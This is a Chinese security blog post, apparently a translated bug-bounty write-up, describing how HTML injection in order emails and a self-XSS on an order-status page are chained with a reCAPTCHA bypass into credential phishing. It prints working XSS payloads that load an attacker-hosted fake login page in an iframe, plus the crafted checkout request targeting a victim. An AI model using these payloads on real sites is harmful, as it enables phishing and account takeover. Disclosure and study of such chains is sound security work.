---
title: 干货：如何利用自动化工具绕过谷歌验证码实现XSS攻击链
url: https://mp.weixin.qq.com/s/j7ynlnjH31IkKV8giCuhhA
source: Doonsec's feed
date: 2026-01-24
fetch_date: 2026-01-25T03:51:25.580053
---

# 干货：如何利用自动化工具绕过谷歌验证码实现XSS攻击链

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOItyBZXY0zJcJbZUAxSWQ8ic0hSuxjbCunjOgPkV3z9AiaTyhUMGvWALpJAyynP7J8ibUsIjzFnurKog/0?wx_fmt=jpeg)

# 干货：如何利用自动化工具绕过谷歌验证码实现XSS攻击链

原创

Pwn1
Pwn1

漏洞集萃

![]()

在小说阅读器中沉浸阅读

> **免责声明**
> 本公众号所发布的文章内容仅供学习与交流使用，禁止用于任何非法用途。

> **Tips总结：**
>
> 1、fuzz **POST** 参数技巧
>
> 2、绕过 **Google reCAPTCHA**
>
> 3、社工网页构造工具 **SingleFile**

目标站点是一个电子商务网站，存在业务结账流程：将商品添加到购物车、填写送货详情、选择付款方式，最后点击 **“下单”** 按钮。

在此阶段，发送了以下请求：

```
POST /v1/order/checkout HTTP/1.1
Host: api.target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: application/json

{
  "billing": {
    "firstName": "a00n",
    "lastName": "a00n"
    "email": "a00n",
    ...
  },
  "shipping": {
    ...
  },
  "paymentMethod": "Paypal",
  "paymentMethodNonce": "PAYPAL_NONCE_HERE",
  "lineItems": [
    ...
  ]
}
```

使用 **Burp Suite** 拦截了这个请求，并在转发之前将一个简单的 HTML 有效负载 `<u>a00n` 注入到多个输入字段中。

请求已成功完成，并返回了 **200 OK** 响应。不久之后，我收到了一封订单确认邮件，内容如下：

![Email HTML Injection](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOItyBZXY0zJcJbZUAxSWQ8ic387wYVTkwicq1BWfcPibm2HPvSHEz7Q076sKEIRxXfg3vq2c4GBlgemw/640?wx_fmt=png&from=appmsg)

这时发现我们插入的 HTML 在电子邮件中出现了

**这说明目标将用户输入直接包含在交易电子邮件之前没有清理或者校验。**

随后为了进一步识别该漏洞的稳定与否，我们修改 `paymentMethodNonce` 为无效内容，并且再次注入 html，发现依旧在邮箱中正常显示

如果我们把邮箱设置为受害者，那么就可以实现发送攻击者控制的 HTML 的邮件。

很好  继续测试

---

## 订单状态页面中的自 XSS 漏洞

随后发现了一个订单状态页面，用户可以通过提供 `订单 ID` 和 `电子邮件地址` 来检索订单详情

该端点受 **Google reCAPTCHA** 保护，据推测是为了防止自动滥用。

输入 `订单 ID`（包含注入的 payload）、`电子邮件地址` 并解决 **reCAPTCHA** 后，显示了订单详细信息，包括渲染的 HTML 有效载荷。

然后又下了另一个订单，这次我在 `firstName` 字段中注入了以下有效载荷：

```
<img src=x onerror=alert(1) />
```

此时再次查看发现在查看此订单的订单状态页面时，JavaScript 代码执行成功：

![XSS in Order Page](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOItyBZXY0zJcJbZUAxSWQ8ic8htkscPiauLAb3Ul9hgKoNQVfIWt3VSEHB1JPNNnYfpociaMicAf5CReg/640?wx_fmt=png&from=appmsg)

这说明存在 **XSS** 漏洞。但是受到 **reCAPTCHA** 保护，所以这只能算是 **self xss**

---

## 绕过谷歌验证码

当时的主要限制是订单状态端点上的 **reCAPTCHA** 保护。

在尝试了几种常见方法后，我始终无法找到直接绕过验证的方法。最终，找到了一个专注于自动化 **reCAPTCHA** 验证的 GitHub 代码库 。

`https://github.com/sarperavci/GoogleRecaptchaBypass`

并且受此启发写了一个绕过验证的 CSRF、工具

`https://github.com/Ay0ubN0uri/Google-Recaptcha-CSRF-POC`

既然已经找到了一种可靠的 **XSS** 触发方法，那么问题就变成了：这种攻击能否进一步升级？

---

## 升级为账户接管

目前我们发现了两个漏洞：**XSS** 和 **HTML 注入**。单独来看，这两个问题影响都不大，所以集中精力将它们串联起来。

由于 `target.com` 是一个电子商务平台，用户身份验证是在专门用于账户管理的独立域名上处理的。那么我们直接窃取会话令牌是不可能的。

不过，电子邮件的 html 注入给我们提供了一个新的途径。通过这一点，我们可以向用户展示一个有奇效的页面。

使用 **SingleFile** 插件创建了一个登录页面，并且使用最少的 JavaScript 代码来获取凭据用来演示，并将其部署在我自己服务器上。

随后，我下了一个新订单，并在 `lastName` 字段中注入了以下有效载荷：

```
<img src=x onerror=i=document.createElement('iframe');i.src='https://myserver.com/index.html';i.style='width:100%;height:100vh';document.body.replaceChildren(i) />
```

并且在 `firstName` 字段中，我添加了指向 CSRF 概念验证的链接：

```
a00n please secure your account by <a href="https://myserver.com/poc.html">login now</a>
```

生成的请求如下：

```
POST /v1/order/checkout HTTP/1.1
Host: api.target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: application/json

{
  "billing": {
    "firstName": "a00n please secure your account by <a href=\"https://myserver.com/poc.html\">login now</a>",
    "lastName": "<img src=x onerror=i=document.createElement('iframe');i.src='https://myserver.com/index.html';i.style='width:100%;height:100vh';document.body.replaceChildren(i) />",
    "email": "victim@target.com",
    ...
  },
  "shipping": {
    ...
  },
  "paymentMethod": "Paypal",
  "paymentMethodNonce": "RANDOM_INVALID_NONCE",
  "lineItems": [
    ...
  ]
}
```

我们发送这个请求，带有 payload 的内容就会发到受害者邮箱

![Email Message](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOItyBZXY0zJcJbZUAxSWQ8ickQekNjgJapIpCGpfdRnLpdtoVSwBSEaz9ro5IdewictG8I7plgkdKRQ/640?wx_fmt=png&from=appmsg)

当受害者打开电子邮件并点击链接时，**我的服务器会解决验证码并渲染包含付款信息的订单页面，然后在 iframe 中加载虚假的登录页面，诱骗用户输入其凭据。**

![Self XSS to ATO](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOItyBZXY0zJcJbZUAxSWQ8icJXgorniasQRKkKqFNkbsVLkvZJsAL7UNnypBPhq6bpHAuE6wk0dFRVQ/640?wx_fmt=png&from=appmsg)

refer：https://blog.ayoubnouri.me/blog/when-self-XSS-isn't-self-anymore

觉得本文内容对您有启发或帮助？
点个**关注➕**，获取更多深度分析与前沿资讯！

👉 往期精选

[攻防演练中的“降维打击”：逃逸出内网边界的影子资产与SaaS供应链挖掘](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484699&idx=1&sn=9455a5c988e2a477fec61e266b526aac&scene=21#wechat_redirect)

[【实战】利用 Salesforce ID 格式特性实现用户遍历](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484848&idx=1&sn=514665a8b9e06b5f30ca1ef9584b640e&scene=21#wechat_redirect)

[API 渗透实战：从 JSON 响应倒推隐藏的高危路由](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484828&idx=1&sn=376a99fecd6210283cc43c2a79633b26&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLRgzxswNMosdb4HdiarwSPg43TDHTKMwbX8kaRZ8iajLgxTBVuwFBynCicFAmAvfvapPCydNnZKwgpw/0?wx_fmt=png)

漏洞集萃

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLRgzxswNMosdb4HdiarwSPg43TDHTKMwbX8kaRZ8iajLgxTBVuwFBynCicFAmAvfvapPCydNnZKwgpw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过